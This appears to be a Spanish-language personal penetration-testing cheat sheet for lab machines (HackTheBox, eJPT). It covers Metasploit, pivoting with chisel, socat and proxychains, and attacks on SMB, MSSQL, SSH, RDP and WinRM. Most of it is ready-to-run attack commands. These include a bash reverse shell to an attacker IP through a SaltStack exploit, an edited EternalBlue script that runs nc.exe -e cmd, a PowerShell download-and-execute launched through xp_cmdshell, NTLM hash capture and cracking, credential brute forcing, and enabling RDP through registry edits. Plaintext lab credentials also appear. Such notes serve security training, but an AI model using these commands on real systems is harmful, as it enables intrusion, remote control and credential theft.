set PAYLOAD windows/meterpreter/reverse_tcp # Segundo
exploit # Tercero, configuro el exploit con los datos
```
- Después, si quiero extraer las credenciales creadas
```bash
migrate -N explorer.exe  # Primero migro el proceso
background  # Segundo
use post/windows/gather/credentials/windows_autologin # Tercero
set SESSION numerosesion #  Cuarto, seleciono la sesión que tengo abierta
exploit # Quinto
```
- Para explotar un servicio msql con metasploit si tengo credenciales:
```bash
scanner/mssql/mssql_login
admin/mssql/mssql_enum
windows/mssql/mssql_payload
```
- Para intentar encontrar un exploit que me permita escalar privilegios puedo utilizar el módulo:
```bash
use post/multi/recon/local_exploit_suggester
```
- Para generar un payload, para ejecutarlo en la máquina objetivo y obtener una shell, puedo usar el módulo (antes de lanzarlo tengo que realizar la configuración que se adecue a la máquina objetivo):
```bash
use exploit/multi/script/web_delibery
```
- Msfvenom es un generador de payloads que se puede usar de forma independiente de metasploit, para ver los payloads que puedo usar (este ejemplo es con perl):
```bash
msfvenom -l payloads | grep "perl"
```
### xsser
- Uso de xsser por Post
- Para ver si es vulnerable(cambiar el campo que puede ser vulnerable por: XSS):
```bash
xsser --url "aquí la url que puede ser vulnerable, es decir, esta sumada la url y la carga que se ve en bursuite"
```
- Lo mismo pero xsser hace busquedas automáticas:
```bash
xsser --url 'http://demo.ine.local/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS' --auto
```
- Lo mismo pero con un payload que nosotros elijamos:
```bash
xsser --url 'http://demo.ine.local/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS' --Fp "<script>alert(1)</script>"
```
- Uso de xsser por Get
```bash
xsser --url "http://demo.ine.local/index.php?page=user-poll.php&csrf-token=&choice=XSS&initials=d&user-poll-php-submit-button=Submit+Vote"
xsser --url "http://demo.ine.local/index.php?page=user-poll.php&csrf-token=&choice=XSS&initials=d&user-poll-php-submit-button=Submit+Vote" --Fp "<script>alert(1)</script>"
```
## Pivoting
- Fuente: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Network%20Pivoting%20Techniques.md
### Chisel
- Primero subimos el chisel.exe a la máquina objetivo, teniendo en cuenta si es de 32 o 64 bits. Descarga: https://github.com/jpillora/chisel/releases:
```bash
chisel.exe client 10.10.14.5:8099 R:8888:127.0.0.1:8888 # Ejecución máquina objetivo
chisel server -p 8099 --reverse # Ejecución máquina atacante
```  
#### Pivotar con chisel
- Si quiero pivotar con chisel haciendo port forwarding, primero subo chisel a la máquina intermedia, después ejecuto chisel en mi equipo:
```bash
chisel server -p 8099 --reverse
```
- Ahora en la máquina interemedia escaneo las redes a las que no tengo acceso y me conecto con chisel a los puertos de esas máquinas (en este ejemplo lo que hago es poder acceder desde mi equipo a los puertos de unos equipos que están fuera de mi rango de alcance, si encuentro una vulneravilidad y quiero entablarme una reverse shell tendría que usar socat después):
```bash
./chisel client 10.10.14.5:8099 R:127.0.0.1:80:172.19.0.2:80 R:127.0.0.1:6379:172.19.0.3:6379
./chisel client 10.10.14.6:8099 R:80:172.19.0.3:80 R:6379:172.19.0.3:6379 # O También
```
### Proxychains
```bash
dynamic_chain # Seleccinar cuando tengo varios túneles abiertos, tengo que ponerlos en orden inverso en el que se han abierto, arriba (primero) el último túnel creado  
strict_chain # Seleccionar cuando solo tengo un túnel abierto
```
- Enviarme todos los puertos con Proxychains y chisel
```bash
./chisel server -p 8099 --reverse # En mi equipo
./chisel client 10.10.14.5:8099 R:socks # En el equipo objetivo
socks5 127.0.0.1 1080 # Tercero, como socks en chisel se refiere a socks5, tengo que comentar el resto de socks y configurar en /etc/proxychains4.conf un socks5 (1080 es el puerto que me asigna chisel)
# Finalmente ya se puede usar poniendo antes del comando que queremos usar poxychains

> Otra forma
./chisel server -p 8099 --socks5 # En mi equipo
./chisel.exe client 10.10.14.5:8099 9090:socks  & # En el equipo objetivo
socks5 127.0.0.1 9090 # Tercero, como socks en chisel se refiere a socks5, tengo que comentar el resto de socks y configurar en /etc/proxychains4.conf un socks5
# Finalmente ya se puede usar poniendo antes del comando que queremos usar poxychains. Si queremos usar el navegador, activar el Foxy proxy con proxychains.

> Doble tunel con Proxychains (Tengo que pasar la conexión por socat):
./chisel server -p 8099 --reverse # En mi equipo, si ya tengo un server abierto me vale
./socat TCP-LISTEN:4545,fork TCP:10.10.14.7:8099 & # Equipo intermedio
./chisel client 10.10.10.50:4545 R:9999:socks # En el equipo objetivo tengo que indicar la ip y el puerto de la conexión abierta con socat en el equipo intermedio y otro puerto para el proxy, ya que por defecto sería el 1080 y el 1080 estaría en uso por el primer túnel, en este caso pongo el 9999
socks5 127.0.0.1 9999 # Tercero, como socks en chisel se refiere a socks5, tengo que configurar en /etc/proxychains4.conf otro socks5, en ese caso por el puerto 9999 y tengo que comentar la opción strict_chain y descomentar la opción dynamic_chain, ya que ahora tendría más de un túnel abierto
# Finalmente ya se puede usar poniendo antes del comando que queremos usar poxychains
```
- Si el Foxyproxy me da problemas al cargar recursos externos, tengo que crear un "Patterns" indicando un nombre y el Patterns que es el dominio "\*softwareportal.windcorp.htb\*" y también pongo en off la opción "Send DNS through SOCKS5 proxy" que está en "edit Proxy".
#### Comandos Proxychains
```bash
seq 1 65535 | xargs -P 500 -I {} proxychains nmap -p{} --open -T3 -v -n 172.19.0.4 -sT -Pn 2>&1 | grep "tcp open"

gobuster -t 100 dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --url http://172.19.0.4/ -x php,html,txt --proxy socks5://127.0.0.1:1080

wfuzz -c -L -t 100 -p localhost:1080:SOCKS5 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hh=11515 http://172.19.0.3/FUZZ/

proxychains wfuzz -c -L -t 100 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hh=11515 http://172.19.0.4/FUZZ/ 2>/dev/null

proxychains nmap -p80 --open -v -n 172.19.0.4 -sT -Pn 2>/dev/null

proxychains nmap --top-ports 100 --open -v -n 172.19.0.3 -sT -Pn 2>/dev/null

proxychains nmap -p6379 --open -v -n 172.19.0.2 -sTCV -Pn 2>/dev/null

ftp: bind: Address already in use # Si me sale este error al usar el proxychains, pongo el comando passive en el ftp
```
### SSH
- Si quiero acceder por ssh haciendo port forwarding, para traerme ese puerto de la máquina objetivo a mi puerto local y poder enumerarlo:
```bash
ssh daniel@10.10.11.136 -L 80:localhost:80

ssh jennifer@10.10.11.131 -L 10000:172.17.0.2:10000 # Así también se puede acceder a los puertos de una tercera máquina
```
- Si quiero acceder por ssh haciendo port forwarding, uso el foxyproxy en ssh por el puerto que tengo configurado para poder verlo en el navegador:
```bash
ssh -D 1234 daniel@10.10.10.102
```
- Si quiero acceder por ssh haciendo port forwarding, usando proxychains para usar el port forwarding por consola:
```bash
socks4 127.0.0.1 1080 # Edito el archivo /etc/proxychains4.conf comentando el resto de socks e incorporando este
ssh -D 1080 charix@10.10.10.84 # Me conecto por ssh
proxychains vncviewer -passwd secret 127.0.0.1:5901 # Ahora ejecuto el comando añadiendo antes proxychains
```
##### sshuttle
- Si quiero tunelizar todas las conexiones por ssh para poder acceder a todos los puertos de la máquina a la que no tengo alcance desde mi equipo (Requisitos: solo Linux con python3). Primero, desde mi equipo me pongo en la carpeta que tengo descargada la `id_rsa` de la máquina intermedia, y despues lazo el siguiente comando:
```bash
sudo sshuttle -r root@10.10.10.100 --ssh-cmd "ssh -i id_rsa" 10.10.10.0/24 -x 10.10.10.100 &

-r root@10.10.10.100 --ssh-cmd "ssh -i id_rsa" # Es para indicar como me voy a conectar
10.10.10.0/24 # Es para indicar a la red que me quiero conectar
-x 10.10.10.100 # Es para excluir una ip dentro del rango
```
### Socat
- Para acceder a un rango de red al que no tengo acceso, puedo intentar pivotar desde un equipo intermediario con socat, primero me descargo socat y lo subo a la maquina intermedia, después me pongo en escucha y lanzo el socat desde la máquina intermedia con el siguiente comando (el siguiente comando lo que hace es redirigir el tráfico, desde el tercer equipo al que no tengo acceso, pasando por la maquina intermedia hasta mi equipo de atacante. Para que todo funcione lo que hago es lanzar una reverse shell desde el tercer equipo al intermedio y este lo regirige al mio):
```bash
Descargar: https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat

./socat TCP-LISTEN:4545,fork TCP:10.10.14.7:5555 &

> Otra forma
./socat tcp-l:4545 tcp:10.10.14.7:5555 &


> Para recibir todas las conexiones entrantes al equipo actual por el puerto 7777:
./socat TCP-LISTEN:7777 stdout
```
#### Socat transferencia de archivos
- Si quiero transferir un archivo aprovechando una conecion establecida con socat, por ejemplo:
```bash
# Supongamos que socat esta corriendo en la máquina 172.19.0.4 con la siquiente instrucción: ./socat TCP-LISTEN:4545,fork TCP:10.10.14.3:5555 &
# Y yo quiero subir un archivo llamado test.txt a la máquina 172.20.0.3 que está en otro segmento de red al que no tengo acceso, pero la máquina 172.19.0.4 si tiene acceso.
# Para aprovechar las conexiones establecidad puedo abrir un servicor con python por el puerto 5555, que es el puerto por el que socat redirige el tráfico a mi equipo: python2 -m SimpleHTTPServer 5555 
# Ahora desde el equipo 172.20.0.3 lanzo por ejemplo un curl -o test.txt http://172.19.0.4/test.txt y con esto el archivo test.txt que esta en mi equipo, tendría que subirse al equipo 172.20.0.3 
```
#### Netsh
- Netsh es una herramienta que ya está instalada en Windows y con ella podría hacer pivoting como lo haría con socat:
```bash
Fuente: https://deephacking.tech/pivoting-con-netsh/

netsh interface portproxy show all
netsh interface portproxy reset

> Con este comando me estoy poniendo en escucha por el puerto 8888 por todas las interfaces, para recibir una conexión entrante y reenviar todo lo me llege a la ip 10.10.11.150 por el puerto 8585:
netsh interface portproxy add v4tov4 listenport=8888 listenaddress=0.0.0.0 connectport=8585 connectaddress=10.10.11.150
```
### Enrutamiento
- Para ver la situacion de enrutamiento en mi equipo linux pongo: `route` o también: `ip route`
- Ejemplo ejpt
```bash
10.196.16.46 # Mi ip
10.196.16.1 # Mi Gateway

# Quiero conectarme a la máquina 195.168.53.102 para la que su Gateway sería 195.168.53.1 y su red 195.168.53.0/24 pero no tengo conectividad con esa red.
# Puedo intentar añadir esa red a mi tabla de enrutamento con ip route.

sudo ip route add 195.168.53.0/24 via 10.196.16.1 # En este ejemplo lo que hago es indicar que quiero que la red 195.168.53.0/24 sea accesible desde desde mi route, que es la ip de mi red 10.196.16.1
sudo ip route add 195.168.53.0/24 dev tun5 # También se puede añadir la red así. Tun5 es la interfaz de conexión de mi red 10.196.16.0/24

sudo ip route del 195.168.53.0/24 via 10.196.16.1 # Quitar la red de mi tabla de enrutamento
sudo ip route del 195.168.53.0/24 dev tun5 # También se puede quitar así, Tun5 es la interfaz de conexión de mi red 10.196.16.0/24

```
- Ejemplo Máquina static
```bash
172.30.0.9 # Mi ip
172.30.0.1 # Mi Gateway

# Quiero conectarme a la máquina 172.20.0.10 para la que su Gateway sería 172.20.0.1 y su red 172.20.0.0/24 pero no tengo conectividad con esa red.
# Puedo intentar añadir esa red a mi tabla de enrutamento con ip route.

sudo ip route add 172.20.0.0/24 via 172.30.0.1 # En este ejemplo lo que hago es indicar que quiero que la red 172.20.0.0/24 sea accesible desde desde mi route, que es la ip de mi red 172.30.0.1
sudo ip route add 172.20.0.0/24 dev tun9 # También se puede añadir la red así. Tun9 es la interfaz de conexión de mi red 172.30.0.0/24

sudo ip route del 172.20.0.0/24 via 172.30.0.1 # Quitar la red de mi tabla de enrutamento
sudo ip route del 172.20.0.0/24 dev tun9 # También se puede quitar así, Tun9 es la interfaz de conexión de mi red 172.30.0.0/24
```
## Servicios
### FTP 21 tcp
- Comandos útiles:
```bash
ftp aquivalaip # Entrar
put elarchivo # Subir archivos
wput ftp://nathan:'Buck3tH4TF0RM3!'@10.10.10.245 ./archivoquequierosubir # Subir archivos
get elarchivo # Bajar archivos
wget ftp://nathan:'Buck3tH4TF0RM3!'@10.10.10.245 # Bajar archivos
ls -la # Para comprobar si hay archivos ocultos estado dentro del ftp
```
- Si el servicio ftp me indica esto: `Using binary mode to transfer files`. Para que los datos al descargarse no se vean alterados tengo que escribir: `binary`
### SSH 22 tcp
#### Comandos útiles
```bash
ssh-keygen # Genera las claves id_rsa e id_rsa.pub
sshpass -p 'VerticalEdge2020' ssh -o stricthostkeychecking=no marcus@10.10.10.238  # Conectarme por ssh. He necesitado añadir -o stricthostkeychecking=no para poder conectarme
```
#### Enumeración de usuarios
- Versiones vulnerables de OpenSSH desde la 2.2 hasta la 7.7 - CVE-2018-15473:
```bash
searchsploit -m linux/remote/45939.py
pip install paramiko # Instalar

python 45939.py 10.10.10.84 root 2>/dev/null
```
#### scp Transferencia de archivos
```bash
scp -i id_rsa nc www-data@172.20.0.10:/tmp/nc # Transferir archivos por ssh, en este ejemplo nc y lo deposita en el directorio /tmp de la máquina objetivo
scp jnelson@10.10.11.186:/home/jnelson/.passpie/.keys private.keys # Transferir archivos a mi equipo
```
#### ssh rbash
```bash
ssh -i id_rsa usuario@192.168.1.60 bash # Una forma de escapar de una rbash (restricted bash) en ssh es inyectar el comando bash al final al conectarme
ssh mindy@10.10.10.51 -t bash
sshpass -p 'P@55W0rd1!2@' ssh mindy@10.10.10.51 bash
```
#### Otros
- Para realizar múltiples intentos de conexión (este ejemplo lo use para que me banearan y se ejecutase un comando al realizar el actionban:
```bash
seq 1 10 | xargs -P 50 -I{} sshpass -p 'password123' ssh -o stricthostkeychecking=no fulanito@10.10.11.100
```
### Whois 43 tcp
- Fuente: https://book.hacktricks.xyz/network-services-pentesting/43-pentesting-whois
```bash
whois <DOMINIO> # Recolección de datos
whois -h 10.10.10.155 -p 43 google.com # Buscar en google
whois -h 10.10.10.155 -p 43 supersechosting.htb # Busqueda a través del VirtualHost
```
### DNS 53 tcp
- Si el puerto 53 esta abierto podemos intentar obtener información
- Fuente: https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns
#### dig
```bash
dig @10.10.10.175 EGOTISTICAL-BANK.LOCAL
dig @10.10.10.175 EGOTISTICAL-BANK.LOCAL ns # Enumera name servers
dig @10.10.10.175 EGOTISTICAL-BANK.LOCAL mx # Enumera servidor de correo
```
- Podemos probar un ataque de transferencia de zona:
```bash
dig @10.10.11.166 trick.htb axfr # Puedo probar varios dominios tipo bank.htb, bank.local para ver si nos devuelve algún dominio o subdominio, si encuentro alguno lo añado al /etc/hosts
```
#### dnsenum DNS Fuerza Bruta
- Con dnsenum podemos realizar un ataque de fuerza bruta sobre los DNS para encontrar nuevos subdominios:
```bash
dnsenum <DOMINIO> # Ver las dns del dominio
dnsenum --dnsserver 10.10.10.224 --threads 20 -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt realcorp.htb
```
#### nslookup
```bash
nslookup 
```
#### dnsrecon
```bash
dnsrecon -d supersechosting.htb -a -n 10.10.10.155 # Ataque de transferencia de zona
```
### POP 110 995 tcp
- Servicio de correo, Post Office Protocol (POP). POP3 es actualmente la versión más usada.
Comandos Útiles:
```bash
Fuente: https://book.hacktricks.xyz/network-services-pentesting/pentesting-pop

telnet 10.10.10.51 110 # Conectarme
nc 10.10.10.51 110 # Conectarme

USER Tom # Insertar usuario
PASS Tom123$! # Insertar usuario
LIST # Lista el número de mensajes y el tamaño          
RETR 1 # Ver el mensaje número 1
QUIT # Salir    
```
### SMB 139 445 tcp
#### nmap smb
- Para enumerar el servicio smb con nmap 445 (smb) and 139 (smb netbios):
```bash
sudo nmap -p139,445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.11.108
```
#### SMB
##### SMBMap
- Es para ver si hay recursos compartidos a través del smb y comprobar a cuales de ellos tenemos acceso de lectura o escritura:
```bash
smbmap -H laipvictima -u 'null'
smbmap -H 10.10.10.97 -u 'tyler' -p '92g!mA8BGjOirkL%OG*&' # Comprobación para un usuario con credenciales válidas

smbmap -H 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -r Users # Ver el contenido de un recurso compartido
smbmap -H 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -R Users # Ver el contenido de un recurso compartido de forma recursiva
smbmap -H 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --download Users/SVC_TGS/Deskop/user.txt # Descargar un archivo
```
##### SMBClient
-Es para ver si hay recursos compartidos a través del smb:
```bash
smbclient -L \\\\laipvictima\\ -N
```
- Si encuentro algo y quiero conectarme utilizo:
```bash
> Sin credenciales:
smbclient //10.10.10.237/Software_Updates -N
smbclient \\\\10.10.10.237\\Software_Updates
smbclient //10.10.10.237/Software_Updates

> Con credenciales válidas
smbclient //10.10.10.97// -U tyler # Despues la password
smbclient //10.10.10.100/Users -U 'SVC_TGS' # Despues la password
```
- Es para crear una montura para el contenido que hay en el smb:
```bash
mount -t cifs //10.10.10.237/Software_Updates  /mnt/test
```
- Para descargar un contenido de forma recursiva, después me pediría la contraseña:
```bash
smbget -R smb://10.10.11.108/SYSVOL -U svc-printer
smbget -R smb://10.10.11.174/support-tools -U null # Null session

> Otra forma:
smb: \> mask ""
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```
- Si crackmapexec me devuelve esto STATUS_PASSWORD_MUST_CHANGE en alguna comprobación, es posible que pueda cambiar la contraseña utilizando este comando:
```bash
smbpasswd -r 10.10.10.193 -U "bhult"
```
##### Crackmapexec smb
- Es para ver las caracteristicas de la máquina a través del smb: `crackmapexec smb laipvictima`
-  Comprobar si las crecenciales de un usuario son válidas con crackmapexec:
```bash
crackmapexec smb 10.10.10.125 -u 'reporting' -p 'PcwTWTHRwryjc$c6' # Comprobar si el usuario es válido
crackmapexec smb 10.10.10.125 -u 'reporting' -p 'PcwTWTHRwryjc$c6' -d WORKGROUP # Comprobar si el usuario es válido a nivel local

crackmapexec smb 10.10.10.63 -u 'Administrator' -H 'e0fb1fb85756c24235ff238cbe81fe00' # Comprobar si el hash es válido
```
- Fuerza bruta:
```bash
crackmapexec smb 10.10.10.172 -u users.txt -p passwords.txt --continue-on-success # Para cada usuario comprueba todas las contraseñas
crackmapexec smb 10.10.10.172 -u users.txt -p passwords.txt --continue-on-success --no-bruteforce # Para cada usuario solo comprueba la contraseña que está en la misma linea del diccionario de passwords
```
##### Eternalblue (MS17-010)
- Si el puerto 445 esta abierto en un sistema Windows antiguo puedo revisar si es vulnerable a eternalblue:
```bash
sudo nmap --script "vuln and safe" -p445 -v 10.10.10.4 # Ver si es vulnerable a ms17-010
```
- Exploit worawit:
```bash
git clone https://github.com/worawit/MS17-010 # Descargo el repositorio
chmod +x checker.py zzz_exploit.py # Doy permisos de ejecución

> Checker.py - Testing named pipes: 
python checker.py 10.10.10.4 # Primero lanzo el chequer tal y como está, si no me aparece nada o me dice "STATUS_ACCESS_DENIED" modifico los campos del script USERNAME y/o PASSWORD incluyendo guest u otros caracteres
# El checker me tendría que dar pipes válidos para utilizarlo posteriormente

> Impacket-smbserver
# Copio el nc.exe a la carpeta de trabajo
impacket-smbserver smbFolder $(pwd) -smb2support # Y abro un servidor por smb

> zzz_exploit.py (si he necesitado modificar alguno de los campos USERNAME y/o PASSWORD también tengo que modificarlo en este):
# Modifico el script comentando las lineas:
#       smbConn = conn.get_smbconnection()
        
#       print('creating file c:\\pwned.txt on the target')
#       tid2 = smbConn.connectTree('C$')
#       fid2 = smbConn.createFile(tid2, '/pwned.txt')
#       smbConn.closeFile(tid2, fid2)
#       smbConn.disconnectTree(tid2)

Ahora quito el comentario de la linea: service_exec(conn, r'cmd /c copy c:\pwned.txt c:\pwned_exec.txt') y la edito:
service_exec(conn, r'cmd /c \\10.10.14.10\smbFolder\nc.exe -e cmd 10.10.14.10 443')
python zzz_exploit.py 10.10.10.4 spoolss # Por último me pongo en escucha y lanzo el script añadiendo un pipe válido
```
- Exploit worawit 3ndG4me:
```bash
Fuente: https://github.com/3ndG4me/AutoBlue-MS17-010
git clone https://github.com/3ndG4me/AutoBlue-MS17-010
chmod +x eternal_checker.py
python eternal_checker.py 10.10.10.40 # Comprueba si es vulnerable y si se puede usar algún named pipes
./shell_prep.sh # Para generar los shellcodes tenemos que ejecutar este script que está dentro de la carpeta shellcode, respondiendo a las preguntas con nuestros datos.
chmod +x eternalblue_exploit7.py
python eternalblue_exploit7.py 10.10.10.40 shellcode/sc_x64.bin # Me pongo en escucha para obtener la shell y ejecuto el exploit seleccionando el shellcode adecuado

# En el caso que me detecte algún named pipe puedo utilizar el exploit zzz_exploit.py:
chmod +x zzz_exploit.py
python zzz_exploit.py 10.10.10.40 # Me pongo en escucha para obtener la shell y ejecuto el exploit
```
### mssql 1443 tcp
```bash
Fuente: https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server

> Formas de autenticarme, necesito tener credenciales válidas, después me pide la contraseña:
impacket-mssqlclient WORKGROUP/reporting@10.10.10.125
impacket-mssqlclient WORKGROUP/reporting@10.10.10.125 -windows-auth

xp_cmdshell "whoami" # Compruebo si puedo ejecutar comandos
sp_configure "show advanced options", 1 # Intentar habilitar las opciones avanzadas. Si me permitiese habilitarlas tengo que poner después el comando: reconfigure
sp_configure "xp_cmdshell", 1 # Intentar habilitar xp_cmdshell. Si me permitiese utilizarlo tengo que poner después el comando: reconfigure

> Intentar capturar un hash net-NTLMv2:
impacket-smbserver smbFolder $(pwd) -smb2support # Me comparto una carpeta con smbserver
xp_dirtree "\\10.10.14.9\smbFolder" # Listo los recursos compartidos con xp_dirtree para obtener el hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash # Intento crackear el hash net-NTLMv2
hashcat -a 0 -m 5600 hash /usr/share/wordlists/rockyou.txt # Intento crackear el hash net-NTLMv2

> Si tengo credenciales válidas y puedo ejecutar comandos con xp_cmdshell, puedo intentar enviarme una reverse shell:
# Me comparto el Invoke-PowerShellTcp.ps1 con un servidor con python me pongo en escucha
xp_cmdshell "powershell IEX(New-Object Net.WebClient).downloadString(\"http://10.10.14.9/Invoke-PowerShellTcp.ps1\")" # Ejecuto el comando
```
### NFS Services 2049 tcp
- Network File System, o NFS, es utilizado para sistemas de archivos distribuido en un entorno de área local. Posibilita que distintos sistemas conectados a una misma red accedan a ficheros remotos como si se tratara de locales.
```bash
Fuente: https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting

showmount -e 10.10.10.180 # Ver los recursos que se están compartiendo
sudo mkdir /mnt/montura
sudo mount -t nfs 10.10.10.180:/site_backups /mnt/montura # Crea la montura
```

### Squid proxy 3128 tcp
- Si tiene un squid proxy puedo intentar hacer fuzzing para descubrir puertos internos abiertos para intentar conectarme, primero hago fuzzing: 
```bash
> Configuro el proxychains4.conf:
http 10.10.10.67 3128 # Edito el archivo poniendo una # a los otros socks y esto al final

> Fuzzing Squid proxy. Después de confugurar el proxychains4.conf ya puedo intentar encontrar puertos abiertos a través del proxy:
proxychains -q nmap -v -n 127.0.0.1 -sT -Pn # También puedo quitar -q y poner al final 2>/dev/null
wfuzz -c -t 100 --hw=399 -z range,1-65535 -p 10.10.10.224:3128:HTTP http://127.0.0.1:FUZZ


proxychains ssh root@localhost # Después intento conectarme por ejemplo por ssh si estubiese abierto
```
- Path archivo de configuración: `/etc/squid/squid.conf`
- Para ver el contenido del squid proxy con curl:
```bash
curl --proxy http://10.10.11.131:3128 http://127.0.0.1
```
- Si el squid proxy solicita credenciales puedo indicarselas así (en este caso usuario=lance.friedman contaseña=o>WJ5-jD<5^m3):
```bash
curl --proxy 'http://lance.friedman:o>WJ5-jD<5^m3@10.10.11.131:3128' http://127.0.0.1
```
- Para hacer fuzzing con gobuster utilizo la url de curl con las credenciales incluidas, pero tengo que url encodear los caracteres especiales: `>=%3E`, `<=3C` y `^=5E` (mirar man ascii):
```bash
> Fuzzing a la ruta principal
gobuster dir --proxy 'http://lance.friedman:o%3EWJ5-jD%3C5%5Em3@10.10.11.131:3128' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --url http://127.0.0.1

> Fuzzing al directorio app y además buscar archivos con la terminación .py y .txt
gobuster dir --proxy 'http://lance.friedman:o%3EWJ5-jD%3C5%5Em3@10.10.11.131:3128' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --url http://127.0.0.1/app -x py,txt # Las rutas encontradas las puedo mirar con curl como antes
```
### MySQL 3306 tcp
- Fuente: https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql
- Comandos útiles:
```bash
service mysql start # Activar el servicio
service mysql restart # Reiniciar el servicio
service mysql stop # Parar el servicio
mysql -u root # Entrar en el servicio
mysql -u root -p # Si tengo contraseña para que me la pida
```
- Comandos útiles para la gestión de las bases de datos:
```bash
show databases; # Ver las bases de datos existentes
create database nombrebasededatos; # Crear base de datos
use nombrebasededatos; # Usar una base de datos
show tables; # Ver si hay tablas
describe accounts; # Ver la composición de una tabla determinada, en este caso accounts
select * from accounts; # Ver los valores que tiene una tabla determinada, en este caso accounts
select user_login,user_pass from wp_users; # Ver el contenudo de una las columnas user_login y user_pass de la tabla wp_users
create user 'yo'@'10.10.10.187' identified by 'yo123'; # Crear un usuario y asignarle una contraseña
DROP DATABASE nombrebasededatos; # Borrar base de datos
create table datos(contenido varchar(10000)); # Crear una tabla dentro de la base de datos
GRANT ALL on mibase.* to 'yo'@'10.10.10.187'; # Dar acceso completo a la base de datos 'mibase' al usuario 'yo'
describe datos; # Ver el contenido de una tabla, en este caso la tabla datos
select contenido from datos; # Listar el contenido de la columna contenido
``` 
- Si tengo credenciales y quiero acceder a un servicio msql (la contraseña va unida a -p sin espacio):
```bash
mysql -u awdmgmt -pUChxKQk96dVtM07 -h 10.104.11.198
```
#### MySQLshow comandos útiles:
```bash
mysqlshow -uadmin -padmin # Acceder con las credenciales admin:admin y ver las bases de datos que hay
mysqlshow -uadmin -padmin users # Ver las tablas de base de datos users
mysqlshow -uadmin -padmin users accounts # Ver las columnas de la tabla accounts
mysql -uadmin -padmin -e "select * from accounts" users # Ahora para ver el contenido de las columnas de la tabla accounts utilizo mysql no mysqlshow
```
### RDP 3389 tcp
- Si tengo credenciales válidas del usuario administrador puedo abrir el puerto 3389 con crackmapexec para conectarme con rdesktop o xfreerdp:
```bash
crackmapexec smb 10.10.10.40 -u 'Administrator' -p 'ejfnIWWDojfWEKM' -M rdp -o action=enable
```
- Si el usuario está en el grupo RDP y tengo credenciales puedo intentar conectarme:
```bash
xfreerdp /v:10.10.10.40 /u:Administrator /p:ejfnIWWDojfWEKM /dynamic-resolution +clipboard
xfreerdp /v:10.10.10.95 /u:Administrator /pth:fe34b627386c89a49eb254f6a267e4d9 /dynamic-resolution +clipboard # Con el hash
rdesktop 10.10.10.40 -u 'Administrator' -p 'ejfnIWWDojfWEKM' 
```
- Si quiero abrir el RDP ejecuto estos 3 comandos en la máquina objetivo, el único requisito es tener permisos de administrador:
```bash
netsh advfirewall firewall add rule name="RDP port" protocol=TCP dir=in localport=3389 action=allow
netsh advfirewall firewall add rule name="RDP port" protocol=TCP dir=out localport=3389 action=allow
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```
### SaltStack 4505 4506 tcp
- Es una herramienta de gestión que permite automatizar la configuración de sistemas de servidores. ZeroMQ esta relacionado con este servicio y es una biblioteca de redes de alta velocidad basada en sockets que SaltStack aprovecha para permitir la comunicación en tiempo real entre sistemas.
- Intentar conseguir RCE:
```bash
searchsploit saltstack
searchsploit -m multiple/remote/48421.txt # Es un script en python
mv 48421.txt exploit.py && chmod +x exploit.py
sudo apt install python3-dev # Para instalar salt, necesité realizar esta instalación primero
pip3 install salt
python3 48421.py --exec 'bash -c "bash -i >& /dev/tcp/10.10.14.9/443 0>&1"' # Me pongo en escucha y ejecuto el exploit
```
### vnc 5800 5801 5900 5901 tcp
- Fuente: https://book.hacktricks.xyz/network-services-pentesting/pentesting-vnc
```bash
vncviewer -passwd secret 127.0.0.1:5901 # Conectarme
```
### Winrm 5985 tcp
- Es el serivicio Microsoft Windows Remote Management.
#### Crackmapexec winrm
- Si tengo el usuario y la contraseña puedo intentar ver si las credenciales sin válidas con crackmapexec, si lo son me pondrá `Pwn3d!`:
```bash
crackmapexec winrm 10.10.11.108 -u 'svc-printer' -p '1edFg43012!!'
```
#### Evil-winrm
- Con winrm podemos acceder a la máquina si tenemos credenciales válidas:
```bash
evil-winrm  -i 10.10.10.237 -u 'Administrator' -p 'kidvscat_admin_@123'
```
- Con winrm podemos acceder a la máquina si tenemos credenciales válidas (hash):
```bash
evil-winrm  -i 10.10.10.237 -u 'Administrator' -H 'fg654h6fg54gb1fdv6gf54hf65bfd31'
```
#### Comandos Evil-winrm
```bash
upload <RUTA> # Subir archivo
download <RUTA> # Bajar archivo
-S # ssl Enable
```
#### Docker con evil-winrm
- También puedo utilizar evil-winrm desde docker si tengo credenciales válidas:
```bash
sudo docker search evil-winrm # Busca la imagen
sudo docker create oscarakaelvis/evil-winrm #  Crea el contenedor
sudo docker images # Ver la IMAGE ID
sudo docker run -it d7e66d6cefa9  -i 10.10.11.108 -u svc-printer -p '1edFg43012!!' # Arranca el contenedor con las credenciales válidas que tengo
```
#### Activar WinRM Windows 7 (Blue)
- Si quiero abrir el puerto 5985 para conectarme al WinRM con evil-winrm:
```bash
# Cambio la red de pública a privada navegando por: Control Panel\Network and Internet\Network and Sharing Center y modifico la red
winrm qc # Responder yes a las dos preguntas (ejemplo realizado en PowerShell y cmd como administrador)
```
### Winrm 5986 tcp
- Es el serivicio Microsoft Windows Remote Management pero por ssl.
#### Evil-winrm
- Accediendo con certificados de un usuario (en este caso los certificados se habian extraido de un archivo pfx):
```bash
evil-winrm -i 10.10.11.152 -S -c cert.crt -k priv.key -p -u
